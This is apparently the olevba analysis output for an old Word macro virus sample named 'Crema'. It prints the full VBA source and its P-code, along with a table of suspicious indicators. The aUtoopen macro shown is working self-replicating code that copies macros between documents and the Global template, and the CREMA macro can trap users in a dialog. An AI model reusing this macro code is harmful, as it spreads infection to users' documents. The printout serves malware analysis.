@@ -1,0 +1,481 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Crema
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Crema - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO archivoplantillas.bas 
+in file: ./Virus.MSWord.Crema - OLE stream: 'Macros/VBA/archivoplantillas'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Dim A$
+A$ = "llora llora cagon la " + Chr(34) + "U" + Chr(34) + " saldra campeon!!"
+WordBasic.MsgBox A$, 64
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO HerramMacro.bas 
+in file: ./Virus.MSWord.Crema - OLE stream: 'Macros/VBA/HerramMacro'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Rem Bl4ck Sc4v3ng3R - PERU 1997
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO aUtoopen.bas 
+in file: ./Virus.MSWord.Crema - OLE stream: 'Macros/VBA/aUtoopen'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Dim me_$
+Dim this$
+Dim origin$
+Dim F$
+Dim G$
+Dim I
+Dim B$
+Dim M$
+Dim tipo
+On Error GoTo -1: On Error GoTo Peru
+me_$ = "Bl4cK Sc4v3ng3R"
+this$ = "Crema Virus"
+origin$ = "PERU"
+If Rnd() < 0.1 Then
+WordBasic.MsgBox me_$ + " - " + origin$, this$, 64
+End If
+F$ = WordBasic.[FileName$]()
+G$ = "Global"
+If (WordBasic.CountMacros(0) < 4) Then
+For I = WordBasic.CountMacros(1) To 1 Step -1
+B$ = WordBasic.[MacroName$](I, 1)
+M$ = ":" + B$
+WordBasic.MacroCopy F$ + M$, G$ + M$, 1
+Next
+Else
+tipo = 1
+If (WordBasic.CountMacros(1) < 4) Then
+WordBasic.FileSaveAs Name:=F$, Format:=1
+For I = WordBasic.CountMacros(0) To 1 Step -1
+B$ = WordBasic.[MacroName$](I, 0)
+M$ = ":" + B$
+WordBasic.MacroCopy G$ + M$, F$ + M$, 1
+Next
+End If
+End If
+WordBasic.Call "CREMA"
+Peru:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO CREMA.bas 
+in file: ./Virus.MSWord.Crema - OLE stream: 'Macros/VBA/CREMA'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Dim dlg As Object
+Dim A$
+If WordBasic.Int(Rnd() * 10) = 1 Then
+WordBasic.BeginDialog 228, 163, "SOY CREMA!!!! :-)"
+WordBasic.TextBox 35, 76, 160, 18, "TextBox1$", 0
+WordBasic.Text 35, 21, 139, 13, "ESE ES LA U!!!!! "
+WordBasic.Text 33, 43, 165, 13, "El mejor de los equipos!!"
+WordBasic.OKButton 66, 115, 88, 21
+WordBasic.EndDialog
+Set dlg = WordBasic.CurValues.UserDialog
+A$ = ""
+On Error GoTo -1: On Error GoTo 2
+2:  Err.Number = 0
+While A$ <> "universitario" And A$ <> "lolo" And A$ <> "peru" And A$ <> "sc4v3ng3r"
+WordBasic.Dialog.UserDialog dlg
+WordBasic.CurValues.UserDialog dlg
+A$ = LCase(dlg.TextBox1$)
+Wend
+End If
+WordBasic.DisableInput 0
+If WordBasic.Int(Rnd() * 10) = 2 Then
+WordBasic.MsgBox "Buena Crema!", "Tu tambien eres hincha!", 64
+End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Crema
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 965 bytes
+' Macros/VBA/archivoplantillas - 1106 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Public Sub MAIN())
+' Line #2:
+' 	Dim 
+' 	VarDefn A
+' Line #3:
+' 	LitStr 0x0015 "llora llora cagon la "
+' 	LitDI2 0x0022 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitStr 0x0001 "U"
+' 	Add 
+' 	LitDI2 0x0022 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitStr 0x0011 " saldra campeon!!"
+' 	Add 
+' 	St A$ 
+' Line #4:
+' 	Ld A$ 
+' 	LitDI2 0x0040 
+' 	Ld WordBasic 
+' 	ArgsMemCall MsgBox 0x0002 
+' Line #5:
+' 	EndSub 
+' Macros/VBA/HerramMacro - 902 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Public Sub MAIN())
+' Line #2:
+' 	Rem 0x001C " Bl4ck Sc4v3ng3R - PERU 1997"
+' Line #3:
+' 	EndSub 
+' Macros/VBA/aUtoopen - 2577 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Public Sub MAIN())
+' Line #2:
+' 	Dim 
+' 	VarDefn me_
+' Line #3:
+' 	Dim 
+' 	VarDefn this
+' Line #4:
+' 	Dim 
+' 	VarDefn origin
+' Line #5:
+' 	Dim 
+' 	VarDefn False
+' Line #6:
+' 	Dim 
+' 	VarDefn G
+' Line #7:
+' 	Dim 
+' 	VarDefn I
+' Line #8:
+' 	Dim 
+' 	VarDefn B
+' Line #9:
+' 	Dim 
+' 	VarDefn M
+' Line #10:
+' 	Dim 
+' 	VarDefn tipo
+' Line #11:
+' 	OnError <crash> 
+' 	BoS 0x0000 
+' 	OnError Peru 
+' Line #12:
+' 	LitStr 0x000F "Bl4cK Sc4v3ng3R"
+' 	St me_$ 
+' Line #13:
+' 	LitStr 0x000B "Crema Virus"
+' 	St this$ 
+' Line #14:
+' 	LitStr 0x0004 "PERU"
+' 	St origin$ 
+' Line #15:
+' 	ArgsLd Rnd 0x0000 
+' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
+' 	Lt 
+' 	IfBlock 
+' Line #16:
+' 	Ld me_$ 
+' 	LitStr 0x0003 " - "
+' 	Add 
+' 	Ld origin$ 
+' 	Add 
+' 	Ld this$ 
+' 	LitDI2 0x0040 
+' 	Ld WordBasic 
+' 	ArgsMemCall MsgBox 0x0003 
+' Line #17:
+' 	EndIfBlock 
+' Line #18:
+' 	Ld WordBasic 
+' 	ArgsMemLd [FileName$] 0x0000 
+' 	St False$ 
+' Line #19:
+' 	LitStr 0x0006 "Global"
+' 	St G$ 
+' Line #20:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0001 
+' 	LitDI2 0x0004 
+' 	Lt 
+' 	Paren 
+' 	IfBlock 
+' Line #21:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	UMi 
+' 	ForStep 
+' Line #22:
+' 	Ld I 
+' 	LitDI2 0x0001 
+' 	Ld WordBasic 
+' 	ArgsMemLd [MacroName$] 0x0002 
+' 	St B$ 
+' Line #23:
+' 	LitStr 0x0001 ":"
+' 	Ld B$ 
+' 	Add 
+' 	St M$ 
+' Line #24:
+' 	Ld False$ 
+' 	Ld M$ 
+' 	Add 
+' 	Ld G$ 
+' 	Ld M$ 
+' 	Add 
+' 	LitDI2 0x0001 
+' 	Ld WordBasic 
+' 	ArgsMemCall MacroCopy 0x0003 
+' Line #25:
+' 	StartForVariable 
+' 	Next 
+' Line #26:
+' 	ElseBlock 
+' Line #27:
+' 	LitDI2 0x0001 
+' 	St tipo 
+' Line #28:
+' 	LitDI2 0x0001 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0001 
+' 	LitDI2 0x0004 
+' 	Lt 
+' 	Paren 
+' 	IfBlock 
+' Line #29:
+' 	Ld False$ 
+' 	ParamNamed New 
+' 	LitDI2 0x0001 
+' 	ParamNamed Format$ 
+' 	Ld WordBasic 
+' 	ArgsMemCall FileSaveAs 0x0002 
+' Line #30:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	UMi 
+' 	ForStep 
+' Line #31:
+' 	Ld I 
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd [MacroName$] 0x0002 
+' 	St B$ 
+' Line #32:
+' 	LitStr 0x0001 ":"
+' 	Ld B$ 
+' 	Add 
+' 	St M$ 
+' Line #33:
+' 	Ld G$ 
+' 	Ld M$ 
+' 	Add 
+' 	Ld False$ 
+' 	Ld M$ 
+' 	Add 
+' 	LitDI2 0x0001 
+' 	Ld WordBasic 
+' 	ArgsMemCall MacroCopy 0x0003 
+' Line #34:
+' 	StartForVariable 
+' 	Next 
+' Line #35:
+' 	EndIfBlock 
+' Line #36:
+' 	EndIfBlock 
+' Line #37:
+' 	LitStr 0x0005 "CREMA"
+' 	Ld WordBasic 
+' 	ArgsMemCall Call 0x0001 
+' Line #38:
+' 	Label Peru 
+' Line #39:
+' 	EndSub 
+' Macros/VBA/CREMA - 2301 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Public Sub MAIN())
+' Line #2:
+' 	Dim 
+' 	VarDefn dlg (As Object)
+' Line #3:
+' 	Dim 
+' 	VarDefn A
+' Line #4:
+' 	ArgsLd Rnd 0x0000 
+' 	LitDI2 0x000A 
+' 	Mul 
+' 	Ld WordBasic 
+' 	ArgsMemLd InStrB 0x0001 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #5:
+' 	LitDI2 0x00E4 
+' 	LitDI2 0x00A3 
+' 	LitStr 0x0011 "SOY CREMA!!!! :-)"
+' 	Ld WordBasic 
+' 	ArgsMemCall BeginDialog 0x0003 
+' Line #6:
+' 	LitDI2 0x0023 
+' 	LitDI2 0x004C 
+' 	LitDI2 0x00A0 
+' 	LitDI2 0x0012 
+' 	LitStr 0x0009 "TextBox1$"
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall TextBox 0x0006 
+' Line #7:
+' 	LitDI2 0x0023 
+' 	LitDI2 0x0015 
+' 	LitDI2 0x008B 
+' 	LitDI2 0x000D 
+' 	LitStr 0x0011 "ESE ES LA U!!!!! "
+' 	Ld WordBasic 
+' 	ArgsMemCall Then 0x0005 
+' Line #8:
+' 	LitDI2 0x0021 
+' 	LitDI2 0x002B 
+' 	LitDI2 0x00A5 
+' 	LitDI2 0x000D 
+' 	LitStr 0x0019 "El mejor de los equipos!!"
+' 	Ld WordBasic 
+' 	ArgsMemCall Then 0x0005 
+' Line #9:
+' 	LitDI2 0x0042 
+' 	LitDI2 0x0073 
+' 	LitDI2 0x0058 
+' 	LitDI2 0x0015 
+' 	Ld WordBasic 
+' 	ArgsMemCall OKButton 0x0004 
+' Line #10:
+' 	Ld WordBasic 
+' 	ArgsMemCall EndDialog 0x0000 
+' Line #11:
+' 	SetStmt 
+' 	Ld WordBasic 
+' 	MemLd CurValues 
+' 	MemLd UserDialog 
+' 	Set dlg 
+' Line #12:
+' 	LitStr 0x0000 ""
+' 	St A$ 
+' Line #13:
+' 	OnError <crash> 
+' 	BoS 0x0000 
+' 	OnError 2 
+' Line #14:
+' 	LineNum 2 
+' 	BoS 0x0004 
+' 	LitDI2 0x0000 
+' 	Ld Err 
+' 	MemSt Number 
+' Line #15:
+' 	Ld A$ 
+' 	LitStr 0x000D "universitario"
+' 	Ne 
+' 	Ld A$ 
+' 	LitStr 0x0004 "lolo"
+' 	Ne 
+' 	And 
+' 	Ld A$ 
+' 	LitStr 0x0004 "peru"
+' 	Ne 
+' 	And 
+' 	Ld A$ 
+' 	LitStr 0x0009 "sc4v3ng3r"
+' 	Ne 
+' 	And 
+' 	While 
+' Line #16:
+' 	Ld dlg 
+' 	Ld WordBasic 
+' 	MemLd Dialog 
+' 	ArgsMemCall UserDialog 0x0001 
+' Line #17:
+' 	Ld dlg 
+' 	Ld WordBasic 
+' 	MemLd CurValues 
+' 	ArgsMemCall UserDialog 0x0001 
+' Line #18:
+' 	Ld dlg 
+' 	MemLd TextBox1$ 
+' 	ArgsLd LCase 0x0001 
+' 	St A$ 
+' Line #19:
+' 	Wend 
+' Line #20:
+' 	EndIfBlock 
+' Line #21:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableInput 0x0001 
+' Line #22:
+' 	ArgsLd Rnd 0x0000 
+' 	LitDI2 0x000A 
+' 	Mul 
+' 	Ld WordBasic 
+' 	ArgsMemLd InStrB 0x0001 
+' 	LitDI2 0x0002 
+' 	Eq 
+' 	IfBlock 
+' Line #23:
+' 	LitStr 0x000C "Buena Crema!"
+' 	LitStr 0x0017 "Tu tambien eres hincha!"
+' 	LitDI2 0x0040 
+' 	Ld WordBasic 
+' 	ArgsMemCall MsgBox 0x0003 
+' Line #24:
+' 	EndIfBlock 
+' Line #25:
+' 	EndSub 
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |aUtoopen            |Runs when the Word document is opened        |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Base64    |<DT                 |PERU                                         |
+|String    |                    |                                             |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
